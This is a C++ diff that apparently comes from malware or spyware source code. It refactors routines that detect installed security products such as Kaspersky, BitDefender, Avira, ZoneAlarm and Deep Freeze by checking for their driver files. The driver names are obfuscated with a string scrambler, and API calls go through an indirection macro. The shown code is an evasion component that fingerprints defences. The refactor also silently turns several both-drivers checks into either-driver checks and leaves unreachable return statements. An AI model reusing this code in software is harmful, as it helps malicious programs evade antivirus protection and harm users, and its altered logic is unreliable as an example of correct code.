@@ -56,6 +56,21 @@ BOOL DriverExists(LPCSTR lpDriverName)
 	return TRUE;
 }
 
+template<typename ...Args>
+BOOL driverExists(LPCSTR lpDriverName, Args... args)
+{
+	if (DriverExists(lpDriverName))
+		return TRUE;
+
+	return driverExists(args...);
+}
+
+template<>
+BOOL driverExists(LPCSTR lpDriverName)
+{
+	return DriverExists(lpDriverName);
+}
+
 BOOL IsEndPoint()
 {
 	ScrambleString ss1("a71itRPv.1J1"); // "wpsdrvnt.sys"
@@ -64,13 +79,7 @@ BOOL IsEndPoint()
 	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
 		return TRUE;
 
-	if (!DriverExists(ss1.get_str()))
-		return FALSE;
-
-	if (!DriverExists(ss2.get_str()))
-		return FALSE;
-
-	return TRUE;
+	return driverExists(ss1.get_str(), ss2.get_str());
 }
 
 // XXX - Que - Detection 
@@ -82,13 +91,7 @@ BOOL IsComodo2()
 	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
 		return TRUE;
 
-	if (!DriverExists(ss1.get_str()))
-		return FALSE;
-
-	if (!DriverExists(ss2.get_str()))
-		return FALSE;
-
-	return TRUE;
+	return driverExists(ss1.get_str(), ss2.get_str());
 }
 
 BOOL IsComodo3()
@@ -101,13 +104,7 @@ BOOL IsComodo3()
 	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
 		return TRUE;
 
-	if (!DriverExists(ss1.get_str()))
-		return FALSE;
-
-	if (!DriverExists(ss2.get_str()))
-		return FALSE;
-
-	return TRUE;
+	return driverExists(ss1.get_str(), ss2.get_str());
 }
 
 BOOL IsAshampoo()
@@ -155,10 +152,7 @@ BOOL IsDeepFreeze()
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	if (!DriverExists(ss1.get_str()))
-		return FALSE;
-
-	return TRUE;
+	return driverExists(ss1.get_str());
 }
 
 BOOL IsAvira()
@@ -169,13 +163,7 @@ BOOL IsAvira()
 	if (IsDriverRunning(ss1.get_wstr()) || IsDriverRunning(ss2.get_wstr()))
 		return TRUE;
 
-	if (!DriverExists(ss1.get_str()))
-		return FALSE;
-
-	if (!DriverExists(ss2.get_str()))
-		return FALSE;
-
-	return TRUE;
+	return driverExists(ss1.get_str(), ss2.get_str());
 }
 
 BOOL IsPCTools()
@@ -185,189 +173,69 @@ BOOL IsPCTools()
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	if (!DriverExists(ss1.get_str()))
-		return FALSE;
-
-	return TRUE;
+	return DriverExists(ss1.get_str());
 }
 
 BOOL IsBitDefender()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[MAX_PATH + 1];
-	HANDLE hff;
-
 	ScrambleString ss1("wfFX.1J1"); // "BDHV.sys"
 
 	if (IsX64System() && IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hff);
-	return TRUE;
+	return DriverExists(ss1.get_str());
 }
 
 BOOL IsBitDefenderAVPlus()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[DLLNAMELEN];
-	HANDLE hff;
-
 	ScrambleString ss1("8Rgp.1J1"); // "avc3.sys"
 	ScrambleString ss2("8Rgp.1J1"); // "avc3.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
 		return TRUE;
-
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hff);
-
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss2.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hff);
-
-	return TRUE;
+	
+	return driverExists(ss1.get_str(), ss2.get_str());
 }
 
 BOOL IsBlink()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[MAX_PATH + 1];
-	HANDLE hff;
-
 	ScrambleString ss1("llJl0.1J1"); // "eeyeh.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hff);
-	return TRUE;
+	return driverExists(ss1.get_str());
 }
 
 BOOL IsSunBeltPF()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[MAX_PATH + 1];
-	HANDLE hff;
-
 	ScrambleString ss1("4ITa.1J1"); // "SbFw.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hff);
-	return TRUE;
+	return driverExists(ss1.get_str());
 }
-
 
 BOOL IsRising()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[DLLNAMELEN];
-	HANDLE hff;
-
 	ScrambleString ss1("tzaI81l.1J1"); // "rfwbase.sys"
 	ScrambleString ss2("FEED4J1.1J1"); // "HookSys.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()) || IsDriverRunning(ss2.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff != INVALID_HANDLE_VALUE) {
-		FNC(FindClose)(hff);
-		return TRUE;
-	}
-
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss2.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff != INVALID_HANDLE_VALUE) {
-		FNC(FindClose)(hff);
-		return TRUE;
-	}
-
-	return FALSE;
+	return driverExists(ss1.get_str(), ss2.get_str());
 }
-
 
 BOOL IsZoneAlarm()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[MAX_PATH + 1];
-	HANDLE hff;
-
 	ScrambleString ss1("R1i8v8Pv.1J1"); // "vsdatant.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff != INVALID_HANDLE_VALUE) {
-		FNC(FindClose)(hff);
-		return TRUE;
-	}
-
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff != INVALID_HANDLE_VALUE) {
-		FNC(FindClose)(hff);
-		return TRUE;
-	}
-
-	return FALSE;
+	return driverExists(ss1.get_str());
 }
 
 BOOL IsMcAfee()
@@ -381,152 +249,70 @@ BOOL IsMcAfee()
 
 BOOL IsPGuard()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[DLLNAMELEN];
-	HANDLE hff;
-
 	ScrambleString ss1("7tEgCd8ti.1J1"); // "procguard.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hff);
-	return TRUE;
+	return driverExists(ss1.get_str());
 }
-
 
 BOOL IsTrend()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[MAX_PATH + 1];
-	HANDLE hff;
-
 	ScrambleString ss1("vogEoo.1J1"); // "tmcomm.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hff);
-	return TRUE;
+	return driverExists(ss1.get_str());
 }
 
 BOOL IsPanda64()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[DLLNAMELEN];
-	HANDLE hff;
-
 	ScrambleString ss1("78RIEEvGu.1J1"); // "pavboot64.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hff);
-	return TRUE;
+	return driverExists(ss1.get_str());
 }
 
 BOOL IsPanda()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[MAX_PATH + 1];
-	HANDLE hff;
-
 	ScrambleString ss1("78R7tEg.1J1"); // "pavproc.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hff);
-	return TRUE;
+	return driverExists(ss1.get_str());
 }
 
 BOOL IsAVG()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[MAX_PATH + 1];
-	HANDLE hff;
-
 	ScrambleString ss1("xXNyf4LtFt.1J1"); // "AVGIDSErHr.sys"
 	ScrambleString ss2("xXNyf4xClPv.lVl"); // "AVGIDSAgent.exe"
 
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff != INVALID_HANDLE_VALUE) {
-		FNC(FindClose)(hff);
-		return TRUE;
-	}
-
 	if (HM_FindPid(ss2.get_str(), FALSE))
 		return TRUE;
 
-	return FALSE;
+	return driverExists(ss1.get_str());
 }
 
 BOOL IsAVG_IS()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[MAX_PATH + 1];
-	HANDLE hff;
-
 	ScrambleString ss1("xXNyf4VV.1J1"); // "AVGIDSxx.sys"
 	ScrambleString ss2("xXNyf4xClPv.lVl"); // "AVGIDSAgent.exe"
 
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff != INVALID_HANDLE_VALUE) {
-		FNC(FindClose)(hff);
-		return TRUE;
-	}
-
 	if (HM_FindPid(ss2.get_str(), FALSE))
 		return TRUE;
 
+	return driverExists(ss1.get_str());
 	return FALSE;
 }
 
@@ -541,16 +327,7 @@ BOOL IsFSecure()
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hff);
-	return TRUE;
+	return driverExists(ss1.get_str());
 }
 
 BOOL IsAvast()
@@ -574,36 +351,13 @@ BOOL IsNortonInternetSecurity()
 
 BOOL IsKaspersky()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[MAX_PATH + 1];
-	HANDLE hff;
-
 	ScrambleString ss1("DWUz.1J1"); // "klif.sys"
 	ScrambleString ss2("DW3.1J1"); // "kl1.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hff);
-
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss2.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hff);
-
+	return driverExists(ss1.get_str(), ss2.get_str());
 	return TRUE;
 }
 
@@ -619,13 +373,7 @@ BOOL IsKerio()
 	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
 		return TRUE;
 
-	if (!DriverExists(ss1.get_str()))
-		return FALSE;
-
-	if (!DriverExists(ss2.get_str()))
-		return FALSE;
-
-	return TRUE;
+	return driverExists(ss1.get_str(), ss2.get_str());
 }
 
 BOOL CopySystemDriver(WCHAR* drv_path)
